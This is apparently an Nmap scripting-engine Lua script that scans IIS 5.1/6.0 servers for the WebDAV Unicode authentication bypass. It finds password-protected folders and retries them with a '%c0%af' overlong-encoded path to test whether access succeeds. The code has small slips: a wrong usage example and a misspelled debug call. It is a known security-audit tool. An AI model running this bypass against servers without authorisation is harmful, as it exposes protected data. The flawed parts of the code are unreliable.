description = [[
Checks for a vulnerability in IIS 5.1/6.0 that allows arbitrary users to access secured WebDAV folders by searching for a password-protected folder and attempting to access it. As of May 2009, this vulnerability is unpatched. 

A list of well known folders (almost 900) is used by default. Each one is checked, and if returns an authentication request (401), another attempt is tried with the malicious encoding. If that attempt returns a successful result (207), then the folder is marked as vulnerable.

This script is based on the Metasploit modules/auxiliary/scanner/http/wmap_dir_webdav_unicode_bypass.rb auxiliary module.
]]

---
-- @usage
-- nmap --script smb-enum-users.nse -p445 <host>
--
-- @output
-- 80/tcp open  http    syn-ack
-- |_ http-iis-webdav-vuln: WebDAV is ENABLED. Vulnerable folders discovered: /secret, /webdav
--
-- @args webdavfolder Selects a single folder to use, instead of using a built-in list
-- @args folderdb The filename of an alternate list of folders.
-- @args basefolder The folder to start in; eg, "/web" will try "/web/xxx"
-----------------------------------------------------------------------

author = "Ron Bowes <ron@skullsecurity.net> and Andrew Orr <andrew@andreworr.ca>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

require "http"
require "nsedebug"
require "shortport"

portrule = shortport.port_or_service({80, 8080}, "http")

---Enumeration for results
local enum_results = 
{
	VULNERABLE = 1,
	NOT_VULNERABLE = 2,
	UNKNOWN = 3
}

---Sends a PROPFIND request to the given host, and for the given folder. Returns a table reprenting a response. 
local function get_response(host, port, folder)
	local webdav_req = '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>'

	local mod_options = {
		header = {
			Host = host.ip,
			Connection = "close",
			["User-Agent"]  = "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",
			["Content-Type"] = "application/xml",
		},
		content = webdav_req
	}

	return http.request(host, port, "PROPFIND " .. folder .. " HTTP/1.1\r\n", mod_options)
end

---Check a single folder on a single host for the vulnerability. Returns one of the enum_results codes. 
local function go_single(host, port, folder)
	local response

	response = get_response(host, port, folder)
	if(response.status == 401) then
		local vuln_response
		local check_folder

		stdnse.print_debug(1, "http-iis-webdav-vuln: Found protected folder (401): %s", folder)

		-- check for IIS 6.0 and 5.1
		-- doesn't appear to work on 5.0
		-- /secret/ becomes /s%c0%afecret/
		check_folder = string.sub(folder, 1, 2) .. "%c0%af" .. string.sub(folder, 3)
		vuln_response = get_response(host, port, check_folder)
		if(vuln_response.status == 207) then
			stdnse.print_debug(1, "http-iis-webdav-vuln: Folder seems vulnerable: %s", folder)
			return enum_results.VULNERABLE
		else
			stdnse.print_debug(1, "http-iis-webdav-vuln: Folder does not seem vulnerable: %s", folder)
			return enum_results.NOT_VULNERABLE
		end
	else
		stdnse.print_debug(3, "http-iis-webdav-vuln: Not a protected folder (%s): %s", response['status-line'], folder)
		return enum_results.UNKNOWN
	end
end

---Checks a list of possible folders for the vulnerability. Returns a list of vulnerable folders. 
local function go(host, port)
	local status, folder
	local results = {}
	local is_vulnerable = true

	local folder_file
	if(nmap.registry.args.folderdb ~= nil) then
		folder_file = nmap.fetchfile(nmap.registry.args.folderdb)
	else
		folder_file = nmap.fetchfile('nselib/data/folders.lst')
	end

	if(folder_file == nil) then
		return false, "Couldn't find folders.lst (should be in nselib/data)"
	end

	local file = io.open(folder_file, "r")
	if not file then
		return false, "Couldn't find folders.lst (should be in nselib/data)"
	end

	while true do
		local result
		local line = file:read()
		if not line then
			break
		end

		if(nmap.registry.args.basefolder ~= nil) then
			line = "/" .. nmap.registry.args.basefolder .. "/" .. line
		else
			line = "/" .. line
		end

		result = go_single(host, port, line)
		if(result == enum_results.VULNERABLE) then
			results[#results + 1] = line
		elseif(result == enum_results.NOT_VULNERABLE) then
			is_vulnerable = false
		else
		end
	end

	file:close()

	return true, results, is_vulnerable
end

action = function(host, port)
	-- Start by checking if '/' is protected -- if it is, we can't do the tests
	local result = go_single(host, port, "/")
	if(result == enum_results.NOT_VULNERABLE) then
		stdnse.print_debug(1, "http-iis-webdav-vuln: Root folder is password protected, aborting.")			
		return "Could not determine vulnerability, since root folder is password protected"
	end

	stdnse.print_debug(1, "http-iis-webdav-vuln: Root folder is not password protected, continuing...")

	response = get_response(host, port, "/")
	if(response.status == 501) then
		-- WebDAV is disabled
		stdnse.pring_debug(1, "http-iis-webdav-vuln: WebDAV is DISABLED (PROPFIND failed).")
		return "WebDAV is DISABLED. Server is not currently vulnerable."
	else
		if(response.status == 207) then
			-- PROPFIND works, WebDAV is enabled
			stdnse.print_debug(1, "http-iis-webdav-vuln: WebDAV is ENABLED (PROPFIND was successful).")
		else
			-- probably not running IIS 5.0/5.1/6.0
			stdnse.print_debug(1, "http-iis-webdav-vuln: PROPFIND request failed with \"%s\".", response['status-line'])
			return "ERROR: This web server is not supported." 
		end
	end


	if(nmap.registry.args.webdavfolder ~= nil) then
		local folder = nmap.registry.args.webdavfolder
		local result = go_single(host, port, "/" .. folder)

		if(result == enum_results.VULNERABLE) then
			return string.format("WebDAV is ENABLED. Folder is vulnerable: %s", folder)
		elseif(result == enum_results.NOT_VULNERABLE) then
			return string.format("WebDAV is ENABLED. Folder is NOT vulnerable: %s", folder)
		else
			return string.format("WebDAV is ENABLED. Could not determine vulnerability of folder: %s", folder)
		end
		
	else
		local status, results, is_vulnerable = go(host, port)
	
	    if(status == false) then
			return "ERROR: " .. results
		else
			if(#results == 0) then
				if(is_vulnerable == false) then
					return "WebDAV is ENABLED. Protected folder found but could not be exploited. Server does not appear to be vulnerable."
				else
					return "WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>"
				end
			else
				return "WebDAV is ENABLED. Vulnerable folders discovered: " .. stdnse.strjoin(", ", results)
			end
		end
	end
end

